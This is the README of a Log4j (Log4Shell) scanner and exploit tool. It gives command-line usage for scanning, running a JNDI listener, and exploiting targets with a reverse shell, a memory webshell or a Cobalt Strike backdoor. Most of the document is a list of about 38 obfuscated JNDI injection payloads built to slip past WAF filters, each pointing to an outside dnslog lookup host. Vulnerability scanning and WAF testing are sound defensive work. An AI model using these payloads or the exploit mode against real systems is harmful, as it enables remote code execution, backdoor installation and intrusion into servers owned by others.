# Log4j-Scaner

:blush: A Log4j vulnerability scanner document to record the process of development.


## Usage
```
Usage:
    python run.py -m scan -t http://127.0.0.1 -p http://127.0.0.1:8080
    python run.py -m scan -f targets.txt -j 1 -L 127.0.0.1:1389
    python run.py -m scan -t http://127.0.0.1 -w 
    python run.py -m jndi -l 127.0.0.1:1389 -k keyword
    python run.py -m exploit -e revershell -l 127.0.0.1:5555 -t http://target.domian -s header -d "Cookie: 123"
    python run.py -h

mode:
    -m scan, --mode scan
        scan vulnerability with Log4j
    -m jndi, --mode jndi
        start a jndi listener which can match the keyword from the client request
    -m exploit, --mode exploit
        exploit the target

Exploit Options:
    -h
        Show helper
    -t <target.domain/target.ip>
        Single target
    -f <filename>
        Target file 
    -s <site>
        The site of vulnerability in the http packet
    -e <reverse/webshell/cs>
        Exploit type:
          reverse: reverse shell
          webshell: memory webshell
          cs: cobalt strike backdoor
    -d <filename/IP:PORT>
        The input of exploit:
          <filename>: webshell file or cobalt strike backdoor
          <IP:PORT>: listener of reverse shell
Exploit Options:
    -h
        Show helper
    -l port
        Listener port
    -j <num>
        Payload id
    -l
        Show payload list
Scan Options:
    -t <target>, --target <target>
        target to scan.
    -f <file path>, --file <file path>
        targets file path.
    -j <num>, --jndipayload <num>
        Used payload, can be list by option -l.
    -L <ip:port>, --local <ip:port>
        Run local jndi server to record the request, but the public IP is essential.
    -p <protocol://ip:port>, --proxy <protocol://ip:port>
        Use proxy
    -h, --help
        Show help
    -w, --waf
        Verify the effectiveness of WAF rules about Log4j. This mode only support options with -t, -p.
    -l, --list
        List all payload can use.
Jndi Options:
    -h, --hlep
        show JNDI Server options
    -l <port>, local <port>
        Used local port to start the JNDI
    -k <keyword>, --key <keyword>
        The keyword will be match in the flow of JNDI.
```

## Function
### Directory
`run.py` main code.
`log` The folder to record the message of running.
`module` The folder of scanner module.
`result` The folder of scanner result
```
Log4jScanner
|   run.py
|
+---log
|       day2021_12_17.txt
|       day2021_12_21.txt
|       day2021_12_23.txt
|
+---modules
|   |   exploit.py
|   |   JndiServer.py
|   |   log.py
|   |   proxy.py
|   |   scan.py
|   |   __init__.py
|   |
|   \---__pycache__
|           exploit.cpython-39.pyc
|           JndiServer.cpython-39.pyc
|           log.cpython-39.pyc
|           scan.cpython-39.pyc
|           __init__.cpython-39.pyc
|
\---result
        dnslog-result-20211217-1503.txt
        dnslog-result-20211217-1518.txt
```

## payloads

```json
{
    "1": r'${jndi:ldap://payload_id.dnslog.domain/status}',
    "2": r'${jndi:${lower:LDAP}://payload_id.dnslog.domain/TomcatBypass/status}',
    "3": r'${${sys:sun.cpu.isalist}jndi:${lower:LDAP}://payload_id.dnslog.domain/TomcatBypass/status}',
    "4": r'${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${upper:m}${lower:i}://payload_id.dnslog.domain/status}}',
    "5": r'${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${lower:p}://payload_id.dnslog.domain/status}}',
    "6": r'${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://payload_id.dnslog.domain/status}',
    "7": r'${${::-j}ndi:rmi://payload_id.dnslog.domain/status}',
    "8": r'${jndi:rmi://payload_id.dnslog.domain/status}',
    "9": r'${${lower:jndi}:${lower:rmi}://payload_id.dnslog.domain/status}',
    "10": r'${${lower:${lower:jndi}}:${lower:rmi}://payload_id.dnslog.domain/status}',
    "11": r'${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://payload_id.dnslog.domain/status}',
    "12": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}:${lower:LDAP}://payload_id.dnslog.domain/status}',
    "13": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}://payload_id.dnslog.domain/TomcatBypass/status}',
    "14": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.dnslog.domain/status}',
    "15": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.dnslog.domain${sys:file.separator}status}',
    "16": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id${sys:sun.cpu.isalist}.dnslog.domain${sys:sun.cpu.isalist}${sys:file.separator}status}',
    "17": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id${sys:sun.cpu.isalist}.dnslog.domain${sys:sun.cpu.isalist}${sys:file.separator}status}',
    "18": r'${jndi:${lower:RMI}://payload_id.dnslog.domain/TomcatBypass/status}',
    "19": r'${${sys:sun.cpu.isalist}jndi:${lower:RMI}://payload_id.dnslog.domain/TomcatBypass/status}',
    "22": r'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}',
    "23": r'${${::-j}ndi:ldap://payload_id.dnslog.domain/status}',
    "25": r'${${lower:jndi}:${lower:rmi}://payload_id.dnslog.domain/status}',
    "26": r'${${lower:${lower:jndi}}:${lower:ldap}://payload_id.dnslog.domain/status}',
    "27": r'${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://payload_id.dnslog.domain/status}',
    "28": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}:${lower:RMI}://payload_id.dnslog.domain/status}',
    "29": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}://payload_id.dnslog.domain/TomcatBypass/status}',
    "30": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.dnslog.domain/status}',
    "31": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.dnslog.domain${sys:file.separator}status}',
    "32": r"${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap$ {env:NaN:-:}//payload_id.dnslog.domain/status}",
    "33": r"${jn${env::-}di:${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
    "34": r"${jn${date:}di${date:':'}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
    "35": r"${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
    "36": r"${j${main:k5:-Nd}i${spring:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
    "37": r"${j${sys:k5:-nD }${lower:i${web:k5:-:}}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
    "38": r"${j${::-nD}i${::-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
    "39": r"${j${EnV:K5:-nD}i:${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
    "40": r"${j${lower:Nd }i${uPper::}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}"
}
```